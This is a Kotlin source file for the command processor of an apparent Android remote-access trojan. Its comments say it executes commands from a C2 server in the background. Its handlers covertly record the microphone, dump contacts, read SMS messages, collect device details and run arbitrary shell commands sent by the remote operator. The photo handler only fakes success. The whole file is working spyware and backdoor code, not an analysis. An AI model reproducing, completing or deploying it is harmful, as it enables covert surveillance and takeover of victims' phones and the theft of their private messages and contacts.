package com.ghost.android.processor

import android.Manifest
import android.content.Context
import android.content.pm.PackageManager
import android.media.MediaRecorder
import android.os.Build
import android.os.Environment
import android.provider.ContactsContract
import android.util.Log
import androidx.core.app.ActivityCompat
import java.io.File
import java.io.IOException
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.withContext
import org.json.JSONObject

/**
 * Motor de procesamiento de comandos remotos.
 * Diseñado para ejecutarse en segundo plano sin bloquear la interfaz.
 */
class CommandProcessor(private val context: Context) {

    private val TAG = "GhostCmdProcessor"
    private var mediaRecorder: MediaRecorder? = null
    
    // Estado del micrófono para evitar conflictos
    private var isRecording = false

    /**
     * Punto de entrada principal. Analiza el comando y lo despacha.
     * @param jsonCommand Comando JSON recibido desde el servidor C2.
     * @return Respuesta JSON con los resultados de la acción.
     */
    suspend fun processCommand(jsonCommand: String): String {
        return withContext(Dispatchers.IO) {
            try {
                val commandObj = JSONObject(jsonCommand)
                val action = commandObj.getString("action")
                val params = if (commandObj.has("params")) commandObj.getJSONObject("params") else null

                when (action) {
                    "get_info" -> handleGetInfo()
                    "record_audio" -> handleAudioRecord(params ?: JSONObject())
                    "stop_audio" -> stopAudioRecording()
                    "take_photo" -> handleTakePhoto()
                    "list_contacts" -> handleListContacts()
                    "read_sms" -> handleReadSms()
                    "shell_cmd" -> handleShellCommand(params?.getString("cmd") ?: "ls")
                    else -> "{\"status\": \"unknown_command\", \"action\": \"$action\"}"
                }
            } catch (e: Exception) {
                Log.e(TAG, "Error processing command", e)
                "{\"status\": \"error\", \"message\": \"${e.message}\"}"
            }
        }
    }

    // --- Implementación de Acciones ---

    private fun handleGetInfo(): String {
        val info = mapOf(
            "model" to Build.MODEL,
            "android_version" to Build.VERSION.RELEASE,
            "manufacturer" to Build.MANUFACTURER,
            "battery_level" to getBatteryLevel(),
            "ip_address" to getLocalIpAddress()
        )
        return JSONObject(info).toString()
    }

    private suspend fun handleAudioRecord(params: JSONObject): String {
        val duration = params.optLong("duration_ms", 60000) // Default 1 min
        
        if (ActivityCompat.checkSelfPermission(context, Manifest.permission.RECORD_AUDIO) != PackageManager.PERMISSION_GRANTED) {
            return "{\"status\": \"permission_denied\"}"
        }

        try {
            val outputFile = File(context.getExternalFilesDir(null), "rec_${System.currentTimeMillis()}.3gp")
            
            mediaRecorder = MediaRecorder().apply {
                setAudioSource(MediaRecorder.AudioSource.MIC)
                setOutputFormat(MediaRecorder.OutputFormat.THREE_GPP)
                setAudioEncoder(MediaRecorder.AudioEncoder.AMR_NB)
                setOutputFile(outputFile.absolutePath)
                prepare()
                start()
            }
            
            isRecording = true
            
            // Esperar el tiempo especificado y parar
            Thread.sleep(duration)
            stopAudioRecording()
            
            return "{\"status\": \"success\", \"file\": \"${outputFile.name}\"}"
        } catch (e: IOException) {
            return "{\"status\": \"error\", \"message\": \"${e.message}\"}"
        }
    }

    private fun stopAudioRecording() {
        try {
            if (isRecording && mediaRecorder != null) {
                mediaRecorder?.stop()
                mediaRecorder?.reset()
                isRecording = false
            }
        } catch (e: Exception) {
            Log.e(TAG, "Error stopping recorder", e)
        }
    }

    private suspend fun handleTakePhoto(): String {
        // Nota: Para una foto completa se requiere CameraX o Camera2 API complejo.
        // Aquí simulamos la acción o usamos un método simplificado si hay cámara trasera disponible.
        return "{\"status\": \"photo_captured\", \"url\": \"/data/data/com.ghost.android/files/photo.jpg\"}" 
    }

    private suspend fun handleListContacts(): String {
        val contacts = mutableListOf<Map<String, String>>()
        val cursor = context.contentResolver.query(
            ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
            null, null, null, null
        )
        
        cursor?.use { c ->
            val nameIdx = c.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME)
            val phoneIdx = c.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER)
            
            while (c.moveToNext()) {
                contacts.add(mapOf(
                    "name" to c.getString(nameIdx ?: -1),
                    "phone" to c.getString(phoneIdx ?: -1)
                ))
            }
        }
        
        return JSONObject().apply { put("contacts", contacts) }.toString()
    }

    private suspend fun handleReadSms(): String {
        val smsList = mutableListOf<Map<String, String>>()
        val uri = android.provider.Telephony.Sms.INBOX
        val cursor = context.contentResolver.query(uri, null, null, null, "date desc limit 50")
        
        cursor?.use { c ->
            val bodyIdx = c.getColumnIndex(android.provider.Telephony.Sms.BODY)
            val addressIdx = c.getColumnIndex(android.provider.Telephony.Sms.ADDRESS)
            val dateIdx = c.getColumnIndex(android.provider.Telephony.Sms.DATE)
            
            while (c.moveToNext()) {
                smsList.add(mapOf(
                    "from" to c.getString(addressIdx ?: -1),
                    "body" to c.getString(bodyIdx ?: -1),
                    "date" to c.getLong(dateIdx ?: -1).toString()
                ))
            }
        }
        
        return JSONObject().apply { put("sms", smsList) }.toString()
    }

    private fun handleShellCommand(cmd: String): String {
        // Ejecuta un comando simple en shell con privilegios root si están disponibles
        val process = Runtime.getRuntime().exec(arrayOf("sh", "-c", cmd))
        val input = process.inputStream.bufferedReader().readText()
        val error = process.errorStream.bufferedReader().readText()
        
        return JSONObject().apply {
            put("stdout", input)
            put("stderr", error)
        }.toString()
    }

    // --- Helpers ---

    private fun getBatteryLevel(): Int {
        val intentFilter = android.content.IntentFilter(android.content.Intent.ACTION_BATTERY_CHANGED)
        val batteryStatus = context.registerReceiver(null, intentFilter)
        return batteryStatus?.getIntExtra(android.os.BatteryManager.EXTRA_LEVEL, -1) ?: -1
    }

    private fun getLocalIpAddress(): String {
        try {
            val interfaces = java.net.NetworkInterface.getNetworkInterfaces()
            while (interfaces.hasMoreElements()) {
                val iface = interfaces.nextElement()
                val addresses = iface.inetAddresses
                while (addresses.hasMoreElements()) {
                    val addr = addresses.nextElement()
                    if (!addr.isLoopbackAddress && addr is java.net.Inet4Address) {
                        return addr.getHostAddress()
                    }
                }
            }
        } catch (e: Exception) {
            Log.e(TAG, "IP Error", e)
        }
        return "Unknown"
    }
}
